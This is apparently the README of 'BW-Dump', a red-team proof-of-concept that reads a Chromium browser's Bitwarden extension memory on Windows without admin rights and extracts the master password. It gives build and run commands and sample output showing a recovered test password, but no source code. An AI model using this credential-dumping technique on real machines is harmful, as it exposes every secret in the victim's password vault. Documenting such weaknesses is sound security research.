# BW-Dump

A proof-of-concept tool that extracts the master password from a locked Bitwarden vault. Only Windows systems are currently supported.

## Building
**Warning: Windows Defender reports the compiled binary as being malicious!**

To build from a system other than Windows:
```bash
env GOOS=windows GOARCH=amd64 go build
```

Otherwise, just use `go build`

## Running
Simply build and execute the binary. It does NOT require admin rights. Make sure, a Chromium browser is running and the Bitwarden extension is installed. In addition, the vault needs to be unlocked at least once. After which, the master password will be stored in memory for a period of time. 

You can also pass the `-d` option to dump memory regions when a pattern is found. For each result, a filename `dump-pid-<PID>-<MEM-REGION>.hex` is created in the current working directory.

**Example Output**
```bash
PS C:\Users\Tester\dev\go\bw-dump> bw-dump.exe

 888 88b, Y8b Y8b Y888P    888 88e
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888     
    
BW-Dump is a forensics tool that extracts Bitwarden Master Passwords from
locked vaults. It reads browser extensions process memory by calling Windows
API functions and searches for magic byte patterns.

Requirements:
  - Chromium browser (Chrome or MSEdge)
  - Bitwarden browser extension
  - Vault unlocked at least once

[+] Found extension processes: [7500]
[+] Searching memory of PID (7500)
[+] Found pattern at MemBaseAddr (0x231a0276c000)
[+] Found password prefix bytes at offset (0x4382a)
[+] Found password length (0x16) or 22 characters
[+] Password: SUPER-SECURE-password8

PS C:\Users\Tester\dev\go\bw-dump> 
```
